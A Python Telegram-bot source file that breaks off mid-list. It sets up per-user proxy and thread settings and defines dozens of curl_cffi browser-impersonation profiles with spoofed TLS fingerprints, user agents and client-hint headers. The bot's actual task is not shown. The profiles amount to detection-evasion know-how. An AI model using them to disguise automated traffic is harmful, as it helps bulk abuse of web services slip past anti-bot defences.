import os
import io
import uuid
import random
import re
import json
import datetime
import threading
import tempfile
import pytz
import telebot
from telebot.types import Message
from concurrent.futures import ThreadPoolExecutor, as_completed
from curl_cffi import requests as cffi_requests

BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
if not BOT_TOKEN:
    raise RuntimeError(
        "BOT_TOKEN environment variable is not set.\n"
        "Get a token from @BotFather on Telegram and set it as BOT_TOKEN."
    )

bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")

user_settings = {}
user_settings_lock = threading.Lock()

def get_settings(uid):
    with user_settings_lock:
        if uid not in user_settings:
            user_settings[uid] = {"proxy": None, "threads": 10}
        return dict(user_settings[uid])

def set_setting(uid, key, value):
    with user_settings_lock:
        if uid not in user_settings:
            user_settings[uid] = {"proxy": None, "threads": 10}
        user_settings[uid][key] = value

CIPHERS_STR = ":".join([
    "TLS_AES_128_GCM_SHA256", "TLS_AES_256_GCM_SHA384",
    "TLS_CHACHA20_POLY1305_SHA256", "ECDHE-ECDSA-AES128-GCM-SHA256",
    "ECDHE-RSA-AES128-GCM-SHA256", "ECDHE-ECDSA-AES256-GCM-SHA384",
    "ECDHE-RSA-AES256-GCM-SHA384", "ECDHE-ECDSA-CHACHA20-POLY1305",
    "ECDHE-RSA-CHACHA20-POLY1305", "ECDHE-RSA-AES128-SHA",
    "ECDHE-RSA-AES256-SHA", "AES128-GCM-SHA256", "AES256-GCM-SHA384",
    "AES128-SHA", "AES256-SHA",
])

_CH = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
_FF = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8"
_SF = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
_ENC_FULL = "gzip, deflate, br, zstd"
_ENC_OLD  = "gzip, deflate, br"

TLS_PROFILES = [
    # ── Chrome (Windows) ────────────────────────────────────────────────────
    {
        "name": "Chrome 133 (Windows)",
        "impersonate": "chrome133",
        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
        "sec_ch_ua": '"Chromium";v="133", "Google Chrome";v="133", "Not(A:Brand";v="24"',
        "sec_ch_ua_platform": '"Windows"', "sec_ch_ua_mobile": "?0",
        "accept_nav": _CH, "accept_api": "*/*",
        "accept_lang": "en-US,en;q=0.9", "accept_encoding": _ENC_FULL,
    },
    {
        "name": "Chrome 131 (Windows)",
        "impersonate": "chrome131",
        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        "sec_ch_ua": '"Chromium";v="131", "Google Chrome";v="131", "Not_A Brand";v="24"',
        "sec_ch_ua_platform": '"Windows"', "sec_ch_ua_mobile": "?0",
        "accept_nav": _CH, "accept_api": "*/*",
        "accept_lang": "en-US,en;q=0.9", "accept_encoding": _ENC_FULL,
    },
    {
        "name": "Chrome 130 (Windows)",
        "impersonate": "chrome130",
        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
        "sec_ch_ua": '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
        "sec_ch_ua_platform": '"Windows"', "sec_ch_ua_mobile": "?0",
        "accept_nav": _CH, "accept_api": "*/*",
        "accept_lang": "en-US,en;q=0.9", "accept_encoding": _ENC_FULL,
    },
    {
        "name": "Chrome 129 (Windows)",
        "impersonate": "chrome129",
        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
        "sec_ch_ua": '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
        "sec_ch_ua_platform": '"Windows"', "sec_ch_ua_mobile": "?0",
        "accept_nav": _CH, "accept_api": "*/*",
        "accept_lang": "en-US,en;q=0.9", "accept_encoding": _ENC_FULL,
    },
    {
        "name": "Chrome 128 (Windows)",
        "impersonate": "chrome128",
        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
        "sec_ch_ua": '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
        "sec_ch_ua_platform": '"Windows"', "sec_ch_ua_mobile": "?0",
        "accept_nav": _CH, "accept_api": "*/*",
        "accept_lang": "en-US,en;q=0.9", "accept_encoding": _ENC_FULL,
    },
    {
        "name": "Chrome 127 (Windows)",
        "impersonate": "chrome127",
        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
        "sec_ch_ua": '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
        "sec_ch_ua_platform": '"Windows"', "sec_ch_ua_mobile": "?0",
        "accept_nav": _CH, "accept_api": "*/*",
        "accept_lang": "en-US,en;q=0.9", "accept_encoding": _ENC_FULL,
    },
    {
        "name": "Chrome 126 (Windows)",
        "impersonate": "chrome126",
        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "sec_ch_ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
        "sec_ch_ua_platform": '"Windows"', "sec_ch_ua_mobile": "?0",
        "accept_nav": _CH, "accept_api": "*/*",
        "accept_lang": "en-US,en;q=0.9", "accept_encoding": _ENC_FULL,
    },
    {
        "name": "Chrome 120 (Windows)",
        "impersonate": "chrome120",
        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "sec_ch_ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        "sec_ch_ua_platform": '"Windows"', "sec_ch_ua_mobile": "?0",
        "accept_nav": _CH, "accept_api": "*/*",
        "accept_lang": "en-US,en;q=0.9", "accept_encoding": _ENC_FULL,
    },
    {
        "name": "Chrome 119 (Windows)",
        "impersonate": "chrome119",
        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "sec_ch_ua": '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
        "sec_ch_ua_platform": '"Windows"', "sec_ch_ua_mobile": "?0",
        "accept_nav": _CH, "accept_api": "*/*",
        "accept_lang": "en-US,en;q=0.9", "accept_encoding": _ENC_OLD,
    },
    {
        "name": "Chrome 116 (Windows)",
        "impersonate": "chrome116",
        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
        "sec_ch_ua": '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
        "sec_ch_ua_platform": '"Windows"', "sec_ch_ua_mobile": "?0",
        "accept_nav": _CH, "accept_api": "*/*",
        "accept_lang": "en-US,en;q=0.9", "accept_encoding": _ENC_OLD,
    },
    {
        "name": "Chrome 110 (Windows)",
        "impersonate": "chrome110",
        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
        "sec_ch_ua": '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
        "sec_ch_ua_platform": '"Windows"', "sec_ch_ua_mobile": "?0",
        "accept_nav": _CH, "accept_api": "*/*",
        "accept_lang": "en-US,en;q=0.9", "accept_encoding": _ENC_OLD,
    },
    {
        "name": "Chrome 107 (Windows)",
        "impersonate": "chrome107",
        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36",
        "sec_ch_ua": '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
        "sec_ch_ua_platform": '"Windows"', "sec_ch_ua_mobile": "?0",
        "accept_nav": _CH, "accept_api": "*/*",
        "accept_lang": "en-US,en;q=0.9", "accept_encoding": _ENC_OLD,
    },
    # ── Chrome (macOS) ───────────────────────────────────────────────────────
    {
        "name": "Chrome 124 (macOS)",
        "impersonate": "chrome124",
        "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "sec_ch_ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
        "sec_ch_ua_platform": '"macOS"', "sec_ch_ua_mobile": "?0",
        "accept_nav": _CH, "accept_api": "*/*",
        "accept_lang": "en-US,en;q=0.9", "accept_encoding": _ENC_FULL,
    },
    {
        "name": "Chrome 123 (macOS)",
        "impersonate": "chrome123",
        "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
        "sec_ch_ua": '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
        "sec_ch_ua_platform": '"macOS"', "sec_ch_ua_mobile": "?0",
        "accept_nav": _CH, "accept_api": "*/*",
        "accept_lang": "en-US,en;q=0.9", "accept_encoding": _ENC_FULL,
    },
    {
        "name": "Chrome 104 (Linux)",
        "impersonate": "chrome104",
        "user_agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36",
        "sec_ch_ua": '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"',
        "sec_ch_ua_platform": '"Linux"', "sec_ch_ua_mobile": "?0",
        "accept_nav": _CH, "accept_api": "*/*",
        "accept_lang": "en-US,en;q=0.9", "accept_encoding": _ENC_OLD,
    },
    {
        "name": "Chrome 101 (Windows)",
        "impersonate": "chrome101",
        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36",
        "sec_ch_ua": '" Not A;Brand";v="99", "Chromium";v="101", "Google Chrome";v="101"',
        "sec_ch_ua_platform": '"Windows"', "sec_ch_ua_mobile": "?0",
        "accept_nav": _CH, "accept_api": "*/*",
        "accept_lang": "en-US,en;q=0.9", "accept_encoding": _ENC_OLD,
    },
    {
        "name": "Chrome 100 (macOS)",
        "impersonate": "chrome100",
        "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_3_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36",
        "sec_ch_ua": '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"',
        "sec_ch_ua_platform": '"macOS"', "sec_ch_ua_mobile": "?0",
        "accept_nav": _CH, "accept_api": "*/*",
        "accept_lang": "en-US,en;q=0.9", "accept_encoding": _ENC_OLD,
    },
    {
        "name": "Chrome 99 (Windows)",
        "impersonate": "chrome99",
        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Safari/537.36",
        "sec_ch_ua": '" Not;A Brand";v="99", "Google Chrome";v="99", "Chromium";v="99"',
        "sec_ch_ua_platform": '"Windows"', "sec_ch_ua_mobile": "?0",
        "accept_nav": _CH, "accept_api": "*/*",
        "accept_lang": "en-US,en;q=0.9", "accept_encoding": _ENC_OLD,
    },
    # ── Edge (Windows) ───────────────────────────────────────────────────────
    {
        "name": "Edge 131 (Windows)",
        "impersonate": "chrome131",
        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0",
        "sec_ch_ua": '"Microsoft Edge";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        "sec_ch_ua_platform": '"Windows"', "sec_ch_ua_mobile": "?0",
        "accept_nav": _CH, "accept_api": "*/*",
        "accept_lang": "en-US,en;q=0.9", "accept_encoding": _ENC_FULL,
    },
    {
        "name": "Edge 101 (Windows)",
        "impersonate": "edge101",
        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36 Edg/101.0.1210.53",
        "sec_ch_ua": '" Not A;Brand";v="99", "Chromium";v="101", "Microsoft Edge";v="101"',
        "sec_ch_ua_platform": '"Windows"', "sec_ch_ua_mobile": "?0",
        "accept_nav": _CH, "accept_api": "*/*",
        "accept_lang": "en-US,en;q=0.9", "accept_encoding": _ENC_OLD,
    },
    {
        "name": "Edge 99 (Windows)",
        "impersonate": "edge99",
        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36 Edg/99.0.1150.30",
        "sec_ch_ua": '" Not;A Brand";v="99", "Microsoft Edge";v="99", "Chromium";v="99"',
        "sec_ch_ua_platform": '"Windows"', "sec_ch_ua_mobile": "?0",
        "accept_nav": _CH, "accept_api": "*/*",
        "accept_lang": "en-US,en;q=0.9", "accept_encoding": _ENC_OLD,
    },
    # ── Firefox ──────────────────────────────────────────────────────────────
    {
        "name": "Firefox 133 (Windows)",
        "impersonate": "firefox133",
        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
        "sec_ch_ua": None, "sec_ch_ua_platform": None, "sec_ch_ua_mobile": None,
        "accept_nav": _FF, "accept_api": "*/*",
        "accept_lang": "en-US,en;q=0.5", "accept_encoding": _ENC_FULL,
    },
    {
        "name": "Firefox 120 (Windows)",
        "impersonate": "firefox120",
        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
        "sec_ch_ua": None, "sec_ch_ua_platform": None, "sec_ch_ua_mobile": None,
        "accept_nav": _FF, "accept_api": "*/*",
        "accept_lang": "en-US,en;q=0.5", "accept_encoding": _ENC_FULL,
    },
    {
        "name": "Firefox 117 (Linux)",
        "impersonate": "firefox117",
        "user_agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:117.0) Gecko/20100101 Firefox/117.0",
        "sec_ch_ua": None, "sec_ch_ua_platform": None, "sec_ch_ua_mobile": None,
        "accept_nav": _FF, "accept_api": "*/*",
        "accept_lang": "en-US,en;q=0.5", "accept_encoding": _ENC_OLD,
    },
    {
        "name": "Firefox 109 (Windows)",
        "impersonate": "firefox109",
        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0",
        "sec_ch_ua": None, "sec_ch_ua_platform": None, "sec_ch_ua_mobile": None,
        "accept_nav": _FF, "accept_api": "*/*",
        "accept_lang": "en-US,en;q=0.5", "accept_encoding": _ENC_OLD,
    },
    {
        "name": "Firefox 102 (Windows)",
        "impersonate": "firefox102",
        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
        "sec_ch_ua": None, "sec_ch_ua_platform": None, "sec_ch_ua_mobile": None,
        "accept_nav": _FF, "accept_api": "*/*",
        "accept_lang": "en-US,en;q=0.5", "accept_encoding": _ENC_OLD,
    },
    {
        "name": "Firefox 100 (macOS)",
        "impersonate": "firefox100",
        "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:100.0) Gecko/20100101 Firefox/100.0",
        "sec_ch_ua": None, "sec_ch_ua_platform": None, "sec_ch_ua_mobile": None,
        "accept_nav": _FF, "accept_api": "*/*",
        "accept_lang": "en-US,en;q=0.5", "accept_encoding": _ENC_OLD,
    },
    {
        "name": "Firefox 98 (Windows)",
        "impersonate": "firefox98",
        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0",
        "sec_ch_ua": None, "sec_ch_ua_platform": None, "sec_ch_ua_mobile": None,
        "accept_nav": _FF, "accept_api": "*/*",
        "accept_lang": "en-US,en;q=0.5", "accept_encoding": _ENC_OLD,
    },
    {
        "name": "Firefox 91 ESR (Windows)",
        "impersonate": "firefox91esr",
        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0",
        "sec_ch_ua": None, "sec_ch_ua_platform": None, "sec_ch_ua_mobile": None,
        "accept_nav": _FF, "accept_api": "*/*",
        "accept_lang": "en-US,en;q=0.5", "accept_encoding": _ENC_OLD,
    },
    # ── Safari (macOS) ───────────────────────────────────────────────────────
    {
        "name": "Safari 17.0 (macOS)",
        "impersonate": "safari17_0",
        "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
        "sec_ch_ua": None, "sec_ch_ua_platform": None, "sec_ch_ua_mobile": None,
        "accept_nav": _SF, "accept_api": "*/*",
        "accept_lang": "en-US,en;q=0.9", "accept_encoding": _ENC_OLD,
    },
    {
        "name": "Safari 15.5 (macOS)",
        "impersonate": "safari15_5",
        "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Safari/605.1.15",
        "sec_ch_ua": None, "sec_ch_ua_platform": None, "sec_ch_ua_mobile": None,
        "accept_nav": _SF, "accept_api": "*/*",
        "accept_lang": "en-US,en;q=0.9", "accept_encoding": _ENC_OLD,
    },
    {
        "name": "Safari 15.3 (macOS)",
        "impersonate": "safari15_3",
        "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_2_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.3 Safari/605.1.15",
        "sec_ch_ua": None, "sec_ch_ua_platform": None, "sec_ch_ua_mobile": None,
        "accept_nav": _SF, "accept_api": "*/*",
        "accept_lang": "en-US,en;q=0.9", "accept_encoding": _ENC_OLD,
    },
    # ── Safari (iOS) ─────────────────────────────────────────────────────────
    {
        "name": "Safari 18.0 (iOS)",
        "impersonate": "safari18_0_ios",
        "user_agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1",
        "sec_ch_ua": None, "sec_ch_ua_platform": None, "sec_ch_ua_mobile": None,
        "accept_nav": _SF, "accept_api": "*/*",
        "accept_lang": "en-GB,en;q=0.9", "accept_encoding": _ENC_OLD,
    },
    {
        "name": "Safari 17.2 (iOS)",
        "impersonate": "safari17_2_ios",
        "user_agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
        "sec_ch_ua": None, "sec_ch_ua_platform": None, "sec_ch_ua_mobile": None,
        "accept_nav": _SF, "accept_api": "*/*",
        "accept_lang": "en-GB,en;q=0.9", "accept_encoding": _ENC_OLD,
    },
    {
        "name": "Safari 18.0 (macOS)",
        "impersonate": "safari18_0",
        "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 15_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15",
        "sec_ch_ua": None, "sec_ch_ua_platform": None, "sec_ch_ua_mobile": None,
        "accept_nav": _SF, "accept_api": "*/*",
        "accept_lang": "en-US,en;q=0.9", "accept_encoding": _ENC_OLD,
    },
    {
        "name": "Safari 16.0 (macOS)",
        "impersonate": "safari16_0",
        "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15",
        "sec_ch_ua": None, "sec_ch_ua_platform": None, "sec_ch_ua_mobile": None,
        "accept_nav": _SF, "accept_api": "*/*",
        "accept_lang": "en-US,en;q=0.9", "accept_encoding": _ENC_OLD,
    },
    {
        "name": "Safari 16.0 (iOS)",
        "impersonate": "safari16_0",
        "user_agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
        "sec_ch_ua": None, "sec_ch_ua_platform": None, "sec_ch_ua_mobile": None,
        "accept_nav": _SF, "accept_api": "*/*",
        "accept_lang": "en-GB,en;q=0.9", "accept_encoding": _ENC_OLD,
    },
    # ── Chrome — older versions (from tls-client profiles) ───────────────────
    {
        "name": "Chrome 117 (Windows)",
        "impersonate": "chrome117",
        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
        "sec_ch_ua": '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
        "sec_ch_ua_platform": '"Windows"', "sec_ch_ua_mobile": "?0",
        "accept_nav": _CH, "accept_api": "*/*",
        "accept_lang": "en-US,en;q=0.9", "accept_encoding": _ENC_OLD,
    },
    {
        "name": "Chrome 112 (Windows)",
        "impersonate": "chrome112",
        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
        "sec_ch_ua": '"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"',
        "sec_ch_ua_platform": '"Windows"', "sec_ch_ua_mobile": "?0",
        "accept_nav": _CH, "accept_api": "*/*",
        "accept_lang": "en-US,en;q=0.9", "accept_encoding": _ENC_OLD,
    },
    {
        "name": "Chrome 111 (Windows)",
        "impersonate": "chrome111",
        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
        "sec_ch_ua": '"Google Chrome";v="111", "Not(A:Brand";v="8", "Chromium";v="111"',
        "sec_ch_ua_platform": '"Windows"', "sec_ch_ua_mobile": "?0",
        "accept_nav": _CH, "accept_api": "*/*",
        "accept_lang": "en-US,en;q=0.9", "accept_encoding": _ENC_OLD,
    },
    {
        "name": "Chrome 109 (Windows)",
        "impersonate": "chrome109",
        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
        "sec_ch_ua": '"Chromium";v="109", "Google Chrome";v="109", "Not_A Brand";v="99"',
        "sec_ch_ua_platform": '"Windows"', "sec_ch_ua_mobile": "?0",
        "accept_nav": _CH, "accept_api": "*/*",
        "accept_lang": "en-US,en;q=0.9", "accept_encoding": _ENC_OLD,
    },
    {
        "name": "Chrome 108 (Windows)",
        "impersonate": "chrome108",
        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
        "sec_ch_ua": '"Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"',
        "sec_ch_ua_platform": '"Windows"', "sec_ch_ua_mobile": "?0",
        "accept_nav": _CH, "accept_api": "*/*",
        "accept_lang": "en-US,en;q=0.9", "accept_encoding": _ENC_OLD,
    },
    {
        "name": "Chrome 106 (Windows)",
        "impersonate": "chrome106",
        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36",
        "sec_ch_ua": '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
        "sec_ch_ua_platform": '"Windows"', "sec_ch_ua_mobile": "?0",
        "accept_nav": _CH, "accept_api": "*/*",
        "accept_lang": "en-US,en;q=0.9", "accept_encoding": _ENC_OLD,
    },
    {
        "name": "Chrome 105 (macOS)",
        "impersonate": "chrome105",
        "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
        "sec_ch_ua": '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"',
        "sec_ch_ua_platform": '"macOS"', "sec_ch_ua_mobile": "?0",
        "accept_nav": _CH, "accept_api": "*/*",
        "accept_lang": "en-US,en;q=0.9", "accept_encoding": _ENC_OLD,
    },
    {
        "name": "Chrome 103 (Windows)",
        "impersonate": "chrome103",
        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36",
        "sec_ch_ua": '" Not;A Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
        "sec_ch_ua_platform": '"Windows"', "sec_ch_ua_mobile": "?0",
        "accept_nav": _CH, "accept_api": "*/*",
        "accept_lang": "en-US,en;q=0.9", "accept_encoding": _ENC_OLD,
    },
    {
        "name": "Chrome 133 PSK (Windows)",
        "impersonate": "chrome133a",
        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
        "sec_ch_ua": '"Chromium";v="133", "Google Chrome";v="133", "Not(A:Brand";v="24"',
        "sec_ch_ua_platform": '"Windows"', "sec_ch_ua_mobile": "?0",
        "accept_nav": _CH, "accept_api": "*/*",
        "accept_lang": "en-US,en;q=0.9", "accept_encoding": _ENC_FULL,
    },
    # ── Firefox — additional versions ────────────────────────────────────────
    {
        "name": "Firefox 135 (Windows)",
        "impersonate": "firefox135",
        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
        "sec_ch_ua": None, "sec_ch_ua_platform": None, "sec_ch_ua_mobile": None,
        "accept_nav": _FF, "accept_api": "*/*",
        "accept_lang": "en-US,en;q=0.5", "accept_encoding": _ENC_FULL,
    },
    {
        "name": "Firefox 132 (Windows)",
        "impersonate": "firefox132",
        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0",
        "sec_ch_ua": None, "sec_ch_ua_platform": None, "sec_ch_ua_mobile": None,
        "accept_nav": _FF, "accept_api": "*/*",
        "accept_lang": "en-US,en;q=0.5", "accept_encoding": _ENC_FULL,
    },
    {
        "name": "Firefox 123 (Windows)",
        "impersonate": "firefox123",
        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
        "sec_ch_ua": None, "sec_ch_ua_platform": None, "sec_ch_ua_mobile": None,
        "accept_nav": _FF, "accept_api": "*/*",
        "accept_lang": "en-US,en;q=0.5", "accept_encoding": _ENC_OLD,
    },
    {
        "name": "Firefox 110 (Windows)",
        "impersonate": "firefox110",
        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:110.0) Gecko/20100101 Firefox/110.0",
        "sec_ch_ua": None, "sec_ch_ua_platform": None, "sec_ch_ua_mobile": None,
        "accept_nav": _FF, "accept_api": "*/*",
        "accept_lang": "en-US,en;q=0.5", "accept_encoding": _ENC_OLD,
    },
    {
        "name": "Firefox 108 (Windows)",
        "impersonate": "firefox108",
        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0",
        "sec_ch_ua": None, "sec_ch_ua_platform": None, "sec_ch_ua_mobile": None,
        "accept_nav": _FF, "accept_api": "*/*",
        "accept_lang": "en-US,en;q=0.5", "accept_encoding": _ENC_OLD,
    },
    {
        "name": "Firefox 106 (macOS)",
        "impersonate": "firefox106",
        "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:106.0) Gecko/20100101 Firefox/106.0",
        "sec_ch_ua": None, "sec_ch_ua_platform": None, "sec_ch_ua_mobile": None,
        "accept_nav": _FF, "accept_api": "*/*",
        "accept_lang": "en-US,en;q=0.5", "accept_encoding": _ENC_OLD,
    },
    {
        "name": "Firefox 105 (Windows)",
        "impersonate": "firefox105",
        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
        "sec_ch_ua": None, "sec_ch_ua_platform": None, "sec_ch_ua_mobile": None,
        "accept_nav": _FF, "accept_api": "*/*",
        "accept_lang": "en-US,en;q=0.5", "accept_encoding": _ENC_OLD,
    },
    {
        "name": "Firefox 104 (Windows)",
        "impersonate": "firefox104",
        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0",
        "sec_ch_ua": None, "sec_ch_ua_platform": None, "sec_ch_ua_mobile": None,
        "accept_nav": _FF, "accept_api": "*/*",
        "accept_lang": "en-US,en;q=0.5", "accept_encoding": _ENC_OLD,
    },
    # ── Opera (Chromium-based) ───────────────────────────────────────────────
    {
        "name": "Opera 91 (Windows)",
        "impersonate": "chrome105",
        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 OPR/91.0.4516.77",
        "sec_ch_ua": '"Opera";v="91", "Chromium";v="105", "Not?A_Brand";v="99"',
        "sec_ch_ua_platform": '"Windows"', "sec_ch_ua_mobile": "?0",
